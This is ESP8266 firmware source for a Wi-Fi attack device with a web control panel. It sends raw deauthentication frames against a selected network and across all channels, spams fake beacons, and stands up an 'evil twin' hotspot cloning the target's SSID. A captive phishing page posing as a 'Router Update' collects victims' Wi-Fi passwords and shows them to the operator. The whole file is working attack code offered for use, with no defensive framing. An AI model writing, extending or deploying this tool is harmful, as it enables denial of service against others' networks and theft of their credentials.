#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

ESP8266WebServer server(80);
DNSServer dnsServer;

// --- STATE GLOBAL (UTUH) ---
String capturedPass = "Waiting...";
String currentTargetSSID = "None";
String customHtml = "<html><body style='text-align:center;'><h2>Router Update</h2><form method='POST' action='/login'>Password:<br><input type='password' name='pw'><input type='submit' value='OK'></form></body></html>";
String spamSSID = "WiFi_Rusuh_87";
int spamQty = 10;

uint8_t targetMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int deauthPkt = 0;
int beaconPkt = 0;
bool isDeauthing = false;
bool isMassDeauth = false;
bool isBeaconSpam = false;

struct WiFiNetwork { String ssid; int ch; int rssi; uint8_t bssid[6]; };
WiFiNetwork networks[20];
int networksFound = 0;

// MASUKKAN HTML ORI LU DI SINI
const char ADMIN_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <style>
        body{font-family:Arial;background:#000;color:#fff;margin:0;padding:10px;text-align:center}
        @keyframes rainbow {
            0% { color: #f00; text-shadow: 0 0 15px #f00; border-color: #f00; box-shadow: 0 0 10px #f00; }
            20% { color: #ff0; text-shadow: 0 0 15px #ff0; border-color: #ff0; box-shadow: 0 0 10px #ff0; }
            40% { color: #0f0; text-shadow: 0 0 15px #0f0; border-color: #0f0; box-shadow: 0 0 10px #0f0; }
            60% { color: #0ff; text-shadow: 0 0 15px #0ff; border-color: #0ff; box-shadow: 0 0 10px #0ff; }
            80% { color: #f0f; text-shadow: 0 0 15px #f0f; border-color: #f0f; box-shadow: 0 0 10px #f0f; }
            100% { color: #f00; text-shadow: 0 0 15px #f00; border-color: #f00; box-shadow: 0 0 10px #f00; }
        }
        .rainbow-text { font-size: 22px; font-weight: bold; text-transform: uppercase; letter-spacing: 3px; margin: 15px 0; display: inline-block; padding: 10px 20px; border: 3px solid; border-radius: 10px; animation: rainbow 3s linear infinite; }
        .dev{font-size:10px;color:#888;margin-bottom:15px}
        .tabs{display:flex;margin-bottom:15px;border-bottom:1px solid orange}
        .tab-btn{flex:1;padding:12px;background:#222;color:#fff;border:none;cursor:pointer;font-size:12px}
        .active-tab{background:orange;color:#000;font-weight:bold}
        .ctrl{display:flex; flex-wrap:wrap; justify-content:space-between; margin-bottom:10px}
        .cmd-box{width:48%; background:#111; padding:5px; border-radius:4px; border:1px solid #333; margin-bottom:5px; box-sizing:border-box}
        .scan-box{width:100%; margin-bottom:10px; border:1px solid #00bcff}
        .cmd{width:100%; padding:12px 0; border:none; border-radius:4px; color:#fff; font-weight:bold; font-size:10px; text-transform:uppercase; cursor:pointer}
        .log-c{font-size:10px; margin-top:4px; font-family:monospace; font-weight:bold}
        @keyframes pulse-active { 0% { box-shadow: 0 0 2px #fff; } 50% { box-shadow: 0 0 15px #fff; opacity: 0.8; } 100% { box-shadow: 0 0 2px #fff; } }
        .btn-active { animation: pulse-active 0.6s infinite; border: 2px solid #fff !important; }
        .pass-box{background:#050; color:#0f0; border:2px dashed #0f0; padding:12px; margin:15px 0; text-align:left; border-radius:8px; font-family:monospace}
        .pass-text{font-size:18px; color:#fff; font-weight:bold; display:block; margin-top:5px}
        table{width:100%; border-collapse:collapse; font-size:12px; margin-bottom:15px}
        th,td{padding:10px 5px; border:1px solid #146dcc}
        th{background:rgba(20,109,204,0.3); color:orange; text-transform:uppercase}
        .btn-sel{background:#eb3489; color:#fff; border:none; padding:6px; border-radius:4px; width:100%; font-size:11px}
        .btn-ok{background:#FFC72C; color:#000; border:none; padding:6px; border-radius:4px; width:100%; font-weight:bold; font-size:11px}
        .set-box{background:#111; padding:10px; border:1px solid #444; margin-bottom:15px; text-align:left; font-size:12px; border-radius:5px}
        .inp{background:#222; color:orange; border:1px solid orange; padding:8px; border-radius:4px; width:94%; margin:5px 0}
        .txt-area{width:94%; height:150px; background:#111; color:#0f0; border:1px solid #444; font-family:monospace; padding:10px}
        #previewModal{display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; padding:20px; box-sizing:border-box}
        .modal-content{background:#fff; width:100%; height:85%; border-radius:10px; overflow:auto; color:#000; text-align:left; padding:15px}
        hr{border:0; border-top:1px solid orange; margin:15px 0}
        .hidden{display:none}
    </style>
</head>
<body>
    <div class="rainbow-text">GMpro87</div>
    <div class='dev'>dev : 9u5M4n9 | HackerPro87</div>
    <div class="tabs">
        <button class="tab-btn active-tab" onclick="openTab('dash', this)">DASHBOARD</button>
        <button class="tab-btn" onclick="openTab('webset', this)">SETTINGS</button>
    </div>

    <div id="dash">
        <div class='ctrl'>
            <div class="cmd-box scan-box">
                <form method='post' action='/?admin=1&scan=1'><button id="btnScan" class='cmd' style='background:#00bcff'>SCAN TARGET</button></form>
                <div id="scanLog" class="log-c" style="color:#fff">READY</div>
            </div>
            <div class="cmd-box">
                <form method='post' action='/?admin=1&deauth=toggle'><button id="btnDeauth" class='cmd' style='background:#0c8'>DEAUTH</button></form>
                <div id="logDeauth" class="log-c" style="color:#0f0">0 pkt</div>
            </div>
            <div class="cmd-box">
                <form method='post' action='/?admin=1&rusuh=toggle'><button id="btnRusuh" class='cmd' style='background:#e60'>MASSDEAUTH</button></form>
                <div id="logRusuh" class="log-c" style="color:#fff">READY</div>
            </div>
            <div class="cmd-box">
                <form method='post' action='/?admin=1&beacon=toggle'><button id="btnBeacon" class='cmd' style='background:#60d'>BEACON</button></form>
                <div id="logBeacon" class="log-c" style="color:#0ff">0 pkt</div>
            </div>
            <div class="cmd-box">
                <form method='post' action='/?admin=1&hotspot=1'><button id="btnHotspot" class='cmd' style='background:#a53'>EVILTWIN</button></form>
                <div id="logHotspot" class="log-c" style="color:#f44">LED: OFF</div>
            </div>
        </div>
        <hr>
        <div id="tableContainer">Menunggu Scan...</div>
        <div class='pass-box'>
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <b>[ CAPTURED PASS ]</b>
                <a href='/?admin=1&clearLog=1' onclick="return confirm('Hapus permanen?')" style='color:#f44; font-size:10px; text-decoration:none;'>[ CLEAR ]</a>
            </div>
            <div id="passContent">
                Target: <span id="curTarget">None</span><br>
                Pass : <span id="curPass" class="pass-text">Waiting...</span>
            </div>
        </div>
    </div>

    <div id="webset" class="hidden">
        <div class='set-box'>
            <b style='color:orange'>BEACON SPAM CONFIG:</b><br>
            <form method='post' action='/?admin=1&updateSpam=1'>
                SSID Name: <input class='inp' name='spamName' value="WiFi_Rusuh_87"><br>
                Qty Packet: <input class='inp' type="number" name='spamQty' value="10"><br>
                <button class='btn-ok' style='width:100%'>SAVE & UPDATE</button>
            </form>
        </div>
        <div class='set-box'>
            <b style='color:orange'>CUSTOM EVILTWIN HTML:</b><br>
            <textarea id="htmlEditor" class="txt-area" placeholder="Paste HTML lu di sini..."></textarea>
            <div style="display:flex; gap:10px; margin-top:10px">
                <button onclick="previewHtml()" class="btn-sel" style="flex:1; background:#00bcff">PREVIEW</button>
                <form method='post' action='/?admin=1&saveHtml=1' style="flex:1">
                    <input type="hidden" id="saveData" name="newHtml">
                    <button onclick="document.getElementById('saveData').value = document.getElementById('htmlEditor').value" class='btn-ok' style='width:100%'>SAVE HTML</button>
                </form>
            </div>
        </div>
    </div>

    <div id="previewModal">
        <div class="modal-content" id="previewContainer"></div>
        <button onclick="closePreview()" class="btn-ok" style="margin-top:20px; background:red; color:white; width:100%">CLOSE PREVIEW</button>
    </div>

    <script>
        function openTab(tabId, btn) {
            document.getElementById('dash').classList.add('hidden');
            document.getElementById('webset').classList.add('hidden');
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active-tab'));
            document.getElementById(tabId).classList.remove('hidden');
            btn.classList.add('active-tab');
        }

        function previewHtml() {
            var code = document.getElementById('htmlEditor').value;
            var container = document.getElementById('previewContainer');
            container.innerHTML = code;
            document.getElementById('previewModal').style.display = 'block';
        }
        function closePreview() { document.getElementById('previewModal').style.display = 'none'; }

        function updateUI() {
            fetch('/st').then(r => r.json()).then(d => {
                document.getElementById('logDeauth').innerText = d.deauthPkt + " pkt";
                document.getElementById('logBeacon').innerText = d.beaconPkt + " pkt";
                document.getElementById('curPass').innerText = d.pass;
                document.getElementById('curTarget').innerText = d.target;
                document.getElementById('tableContainer').innerHTML = d.table;
                
                if(d.isD) document.getElementById('btnDeauth').classList.add('btn-active');
                else document.getElementById('btnDeauth').classList.remove('btn-active');
                
                if(d.isM) {
                   document.getElementById('btnRusuh').classList.add('btn-active');
                   document.getElementById('logRusuh').innerText = "ATTACKING...";
                } else {
                   document.getElementById('btnRusuh').classList.remove('btn-active');
                   document.getElementById('logRusuh').innerText = "READY";
                }

                if(d.isB) document.getElementById('btnBeacon').classList.add('btn-active');
                else document.getElementById('btnBeacon').classList.remove('btn-active');
            });
        }
        setInterval(updateUI, 2000);
    </script>
</body>
</html>
)=====";

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("GMpro87_Admin", "12345678"); 
  dnsServer.start(53, "*", IPAddress(192,168,4,1));

  server.on("/", []() {
    if (server.hasArg("admin")) {
      if (server.hasArg("scan")) WiFi.scanNetworks(true);
      if (server.hasArg("deauth")) isDeauthing = !isDeauthing;
      if (server.hasArg("rusuh")) isMassDeauth = !isMassDeauth;
      if (server.hasArg("beacon")) isBeaconSpam = !isBeaconSpam;
      if (server.hasArg("updateSpam")) {
        spamSSID = server.arg("spamName");
        spamQty = server.arg("spamQty").toInt();
      }
      if (server.hasArg("saveHtml")) customHtml = server.arg("newHtml");
      if (server.hasArg("sel")) {
        int idx = server.arg("sel").toInt();
        currentTargetSSID = networks[idx].ssid;
        memcpy(targetMac, networks[idx].bssid, 6);
      }
      if (server.hasArg("hotspot")) WiFi.softAP(currentTargetSSID.c_str());
      if (server.hasArg("clearLog")) capturedPass = "Waiting...";
    }
    server.send_P(200, "text/html", ADMIN_HTML);
  });

  server.on("/st", []() {
    String table = "<table><tr><th>SSID</th><th>Ch</th><th>RSSI</th><th>TARGET</th></tr>";
    int n = WiFi.scanComplete();
    if(n > 0) {
      networksFound = n;
      for(int i=0; i<n && i<20; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].ch = WiFi.channel(i);
        networks[i].rssi = WiFi.RSSI(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        String btnClass = (networks[i].ssid == currentTargetSSID) ? "btn-ok" : "btn-sel";
        String btnText = (networks[i].ssid == currentTargetSSID) ? "SELECTED" : "SELECT";
        table += "<tr><td>"+networks[i].ssid+"</td><td>"+String(networks[i].ch)+"</td><td>"+String(networks[i].rssi)+"</td><td><form method='post' action='/?admin=1&sel="+String(i)+"'><button class='"+btnClass+"'>"+btnText+"</button></form></td></tr>";
      }
    }
    table += "</table>";
    
    String json = "{\"deauthPkt\":"+String(deauthPkt)+",\"beaconPkt\":"+String(beaconPkt)+",\"pass\":\""+capturedPass+"\",\"target\":\""+currentTargetSSID+"\",\"table\":\""+table+"\",\"isD\":"+(isDeauthing?"1":"0")+",\"isM\":"+(isMassDeauth?"1":"0")+",\"isB\":"+(isBeaconSpam?"1":"0")+"}";
    server.send(200, "application/json", json);
  });

  server.on("/login", HTTP_POST, []() {
    if(server.hasArg("pw")) capturedPass = server.arg("pw");
    server.send(200, "text/html", "System Update... Please wait.");
  });

  server.onNotFound([]() {
    server.send(200, "text/html", customHtml);
  });

  server.begin();
  wifi_promiscuous_enable(1);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (isDeauthing) {
    uint8_t pkt[26] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5], targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5], 0x00, 0x00, 0x01, 0x00};
    wifi_send_pkt_freedom(pkt, 26, 0);
    deauthPkt++;
    delay(1);
  }

  if (isMassDeauth) {
    for (int ch = 1; ch <= 13; ch++) {
      wifi_set_channel(ch);
      uint8_t pkt[26] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0x00, 0x00, 0x01, 0x00};
      for(int i=0; i<5; i++) wifi_send_pkt_freedom(pkt, 26, 0);
      delay(10);
    }
  }

  if (isBeaconSpam) {
    for(int i=0; i<spamQty; i++) {
      uint8_t pkt[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04, 0x00, (uint8_t)spamSSID.length() };
      for(int j=0; j<spamSSID.length(); j++) pkt[38+j] = spamSSID[j];
      wifi_send_pkt_freedom(pkt, 38 + spamSSID.length(), 0);
      beaconPkt++;
    }
    delay(100);
  }
  yield();
}
